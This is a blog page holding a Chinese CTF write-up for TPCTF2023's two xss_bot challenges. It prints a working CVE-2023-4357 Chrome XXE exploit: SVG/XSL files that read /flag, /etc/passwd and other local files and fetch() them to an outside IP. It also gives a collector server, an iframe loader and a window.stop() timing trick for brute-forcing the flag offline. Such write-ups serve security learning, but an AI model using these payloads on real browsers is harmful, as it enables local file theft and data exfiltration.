@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="出两个xss bot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TPCTF2023">
+<meta property="og:url" content="http://example.com/2023/11/29/TPCTF2023/index.html">
+<meta property="og:site_name" content="unknown&#39;s Blog">
+<meta property="og:description" content="出两个xss bot">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-29T00:52:08.886Z">
+<meta property="article:author" content="unknown">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/11/29/TPCTF2023/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>TPCTF2023 | unknown's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">unknown's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/29/TPCTF2023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/unknown.jpg">
+      <meta itemprop="name" content="unknown">
+      <meta itemprop="description" content="memories matter">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="unknown's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TPCTF2023
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-29 00:00:00 / Modified: 08:52:08" itemprop="dateCreated datePublished" datetime="2023-11-29T00:00:00+08:00">2023-11-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">出两个xss bot</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="xss-bot"><a href="#xss-bot" class="headerlink" title="xss_bot"></a>xss_bot</h1><h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h2><p>参考这里：<a target="_blank" rel="noopener" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE</a></p>
+<p>第一天晚上测试了贼久，post返回的数据为空，第二天早上再测，逐步排查问题，在环境里加代码，selenium访问完页面截一张图出来，哈，看到flag了，说明方法是对的，只是数据带回来时候出错了。索性直接把flag用get参数带回来，出了。</p>
+<p>a.svg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;?#&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE div [ </span><br><span class="line">  &lt;!ENTITY passwd_p        &quot;file:///flag&quot;&gt;</span><br><span class="line">  &lt;!ENTITY passwd_c SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line">  &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">    &lt;xsl:copy-of select=&quot;document(&#x27;&#x27;)&quot;/&gt;</span><br><span class="line">    &lt;body xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">      &lt;div style=&quot;display:none&quot;&gt;</span><br><span class="line">        &lt;p class=&quot;&amp;passwd_p;&quot;&gt;&amp;passwd_c;&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;width:40rem&quot; id=&quot;r&quot; /&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script&gt;</span><br><span class="line">        document.querySelector(&#x27;#r&#x27;).innerHTML = `</span><br><span class="line">remote web url:    &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;$&#123;location.href&#125;&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`;</span><br><span class="line">        document.querySelectorAll(&#x27;p&#x27;).forEach(p =&gt; &#123;</span><br><span class="line">          //You can send p.innerHTML by POST.</span><br><span class="line">          document.querySelector(&#x27;#r&#x27;).innerHTML += `</span><br><span class="line">local file path:   &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;$&#123; p.className &#125;&amp;lt;/textarea&gt;&amp;lt;br/&gt;</span><br><span class="line">local file content:&amp;lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;$&#123; p.innerHTML &#125;&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`;</span><br><span class="line"></span><br><span class="line">        fetch(&#x27;http://120.76.118.202:13000/data?&#x27;+&#x27;1111111111&#x27;, &#123;</span><br><span class="line">            method:&quot;POST&quot;,</span><br><span class="line">            headers:&#123;&quot;Content-Type&quot;:&quot;application/json&quot;&#125;,</span><br><span class="line">            body:JSON.stringify(&#123;p:p.innerHTML&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>server.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const port = 13000;</span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;))</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/data&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;data!!!&#x27;,req.method)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Method&#x27;, &#x27;POST&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;content-type&#x27;);</span><br><span class="line">    // console.log(req.headers)</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    console.log(req.query)</span><br><span class="line">    // console.log(req)</span><br><span class="line">    res.send(&#x27;ok&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">  console.log(`Example app listening on port $&#123;port&#125;`);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="一开始不通的解法"><a href="#一开始不通的解法" class="headerlink" title="一开始不通的解法"></a>一开始不通的解法</h2><p>一开始参考这个：<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2224247.html">https://cn-sec.com/archives/2224247.html</a></p>
+<p>解题大致思路：发送b.html给bot，bot访问b.html，加载iframe，iframe再加载test.svg和解析test.xsl。要做的只是把iframe里的内容带出来。</p>
+<p>本地起题目环境测试，发现vps上的test.svg和test.xsl都能被访问，但是没有发送带回数据的请求。</p>
+<p>自己再测试，b.html，svg，xsl都放到同一个vps上，可以发带回数据的请求。</p>
+<p>再测试，b.html放到8.222.191.116，svg和xsl放到别的地方，访问b.html，浏览器报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught DOMException: Blocked a frame with origin &quot;http://8.222.191.116:13000&quot; from accessing a cross-origin frame.</span><br></pre></td></tr></table></figure>
+
+<p>提示问题出在这里：<code>const ifrDoc = ifr.contentWindow.document.documentElement;</code></p>
+<p>此时查看到svg和xsl都被访问到了。</p>
+<p>下面是代码</p>
+<p>test.svg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;#&quot;?&gt;</span><br><span class="line">&lt;xsl:stylesheet id=&quot;color-change&quot; version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">	&lt;svg version=&quot;1.1&quot; id=&quot;Capa_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 1000 1000&quot;&gt;</span><br><span class="line">		&lt;foreignObject id=&quot;myObj&quot; width=&quot;1000&quot; height=&quot;1000&quot;&gt;</span><br><span class="line">		    &lt;div style=&quot;font-size:xxx-large&quot; xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">			&lt;a href=&quot;#&quot;&gt;#Copy me#&lt;/a&gt;&lt;br/&gt;</span><br><span class="line">			XSL: &lt;xsl:value-of select=&quot;system-property(&#x27;xsl:version&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">			Vendor: &lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">			Vendor URL: &lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor-url&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">			document() &lt;xsl:copy-of  select=&quot;document(&#x27;test.xsl&#x27;)&quot;/&gt;</span><br><span class="line">		    &lt;/div&gt;</span><br><span class="line">		&lt;/foreignObject&gt;</span><br><span class="line">	&lt;/svg&gt;</span><br><span class="line"> &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>test.xsl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE p [</span><br><span class="line">&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY hosts SYSTEM &quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY group SYSTEM &quot;file://localhost/etc/group&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">  &lt;p style=&quot;border-style: dotted;&quot;&gt;/etc/passwd: </span><br><span class="line">&amp;passwd;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;p style=&quot;border-style: dotted;&quot;&gt;/etc/hosts:</span><br><span class="line">&amp;hosts;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;p style=&quot;border-style: dotted;&quot;&gt;/etc/group:</span><br><span class="line">&amp;group;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">   &lt;p style=&quot;border-style: dotted;&quot;&gt;/flag:</span><br><span class="line"> &amp;flag;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>server.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const port = 13000;</span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;))</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/test.svg&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/test.svg&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    // res.set(&#x27;X-Frame-Options&#x27;,&#x27;SAMEORIGIN&#x27;)</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;test.svg&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/data&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;data!!!&#x27;,req.method)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Method&#x27;, &#x27;POST&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type&#x27;);</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    console.log(req.query)</span><br><span class="line">    // console.log(req)</span><br><span class="line">    res.send(&#x27;ok&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.all(&#x27;/b.html&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/b.html&#x27;)</span><br><span class="line">    // res.set(&#x27;X-Frame-Options&#x27;,&#x27;SAMEORIGIN&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;b.html&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/b.svg&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/b.svg&#x27;)</span><br><span class="line">    // res.set(&#x27;X-Frame-Options&#x27;,&#x27;SAMEORIGIN&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;b.svg&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/test.xsl&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/test.xsl&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;test.xsl&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">  console.log(`Example app listening on port $&#123;port&#125;`);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>b.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const r = document.createElement(&#x27;div&#x27;);</span><br><span class="line">        r.style.width = &#x27;40rem&#x27;;document.body.appendChild(r);</span><br><span class="line">        const ifr = document.createElement(&#x27;iframe&#x27;);</span><br><span class="line">        ifr.style.display = &#x27;none&#x27;;</span><br><span class="line">        document.body.appendChild(ifr);</span><br><span class="line">        ifr.onload = function() &#123;</span><br><span class="line">            const ifrDoc = ifr.contentWindow.document.documentElement;</span><br><span class="line">            r.innerHTML = `remote web url:&lt;input value=&quot;$&#123;location.href&#125;&quot; style=&quot;width:100%&quot; /&gt;&lt;br/&gt;&lt;br/&gt;`;</span><br><span class="line">            ifrDoc.querySelectorAll(&#x27;p&#x27;).forEach(p =&gt; </span><br><span class="line">            &#123;</span><br><span class="line">                r.innerHTML += `local file path:&lt;input value=&quot;$&#123;p.getAttribute(&quot;path&quot;)&#125;&quot; style=&quot;width:100%&quot; /&gt;&lt;br/&gt;local file content:&lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;$&#123;p.innerHTML&#125;&lt;/textarea&gt;&lt;br/&gt;&lt;br/&gt;`;</span><br><span class="line">                fetch(&#x27;http://120.76.118.202:13000/data&#x27;, &#123;</span><br><span class="line">                     method:&quot;POST&quot;,</span><br><span class="line">                     body:JSON.stringify(&#123;p:p.innerHTML&#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        ifr.src = &quot;http://120.76.118.202:13000/test.svg&quot;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="xss-bot-no-internet"><a href="#xss-bot-no-internet" class="headerlink" title="xss_bot no internet"></a>xss_bot no internet</h1><p>没别的地方可看了，只能看看这部分有没有地方可以触发报错或者延时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_argument(&quot;--no-sandbox&quot;)  # sandbox not working in docker</span><br><span class="line">    options.add_argument(&quot;--headless&quot;)</span><br><span class="line">    options.add_argument(&quot;--disable-gpu&quot;)</span><br><span class="line">    options.add_argument(&quot;--user-data-dir=/dev/shm/user-data/&quot;+user_id)</span><br><span class="line">    os.environ[&quot;TMPDIR&quot;] = &quot;/dev/shm/chromium-data/&quot;</span><br><span class="line">    options.add_experimental_option(&quot;excludeSwitches&quot;, [&quot;enable-logging&quot;])</span><br><span class="line"></span><br><span class="line">    with webdriver.Chrome(options=options) as driver:</span><br><span class="line">        ua = driver.execute_script(&quot;return navigator.userAgent&quot;)</span><br><span class="line">        print(&quot; I am using&quot;, ua)</span><br><span class="line">        driver.set_page_load_timeout(15)</span><br><span class="line">        print(&quot;- Now browsing your website...&quot;)</span><br><span class="line">        driver.get(&quot;http://localhost:&quot;+port_id+&quot;/&quot;+file_name)</span><br><span class="line">        time.sleep(4)</span><br><span class="line">        print(&quot;Bye bye!&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;ERROR&quot;, type(e))</span><br><span class="line">    print(&quot;I&#x27;ll not give you exception message this time.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>看了一会，只能想办法让<code>set_page_load_timeout</code>报异常了。</p>
+<p>去搜如何延缓页面加载时间，普通的setTimeout是不行的。</p>
+<p>…….</p>
+<p><code>&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;</code>，本地测试，这玩意写进去能够延缓访问时间，但只能延缓近0.1秒，根本不够。但是也没管那么多，写进题目里看看，报异常了……估计是我环境通网找不到1.1.1.1就直接取消了，而题目由于不通网就一直卡住。还是得是实际测试。</p>
+<p>接下来就是判断字符，然后动态写入这个标签。</p>
+<p>测试发现，只要代码里含有<code>&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;</code>就会超时，无论是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(false)&#123;</span><br><span class="line">	document.write(`&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;`)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>换了个写法，但是不超时了，也不行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(String.fromCharCode(...))</span><br></pre></td></tr></table></figure>
+
+<p>又卡住了。</p>
+<p>……</p>
+<p>那既然写了script标签怎样都会超时，那看看能不能手动停止加载页面。又搜索了一番，<code>window.stop()</code>可以。测试，成了。</p>
+<p>所以只要判断字符对了就执行<code>window.stop()</code></p>
+<p>剩下的就是爆破了，手动爆破，先爆长度再爆范围。</p>
+<p>爆破时候发现小于号&lt;不生效，我猜测是给当做标签开头来处理了，这毕竟不是正规的js文件，出问题也正常。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/31/ACTF2023/" rel="prev" title="ACTF2023">
+      <i class="fa fa-chevron-left"></i> ACTF2023
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/12/31/2023-summary/" rel="next" title="2023-summary">
+      2023-summary <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
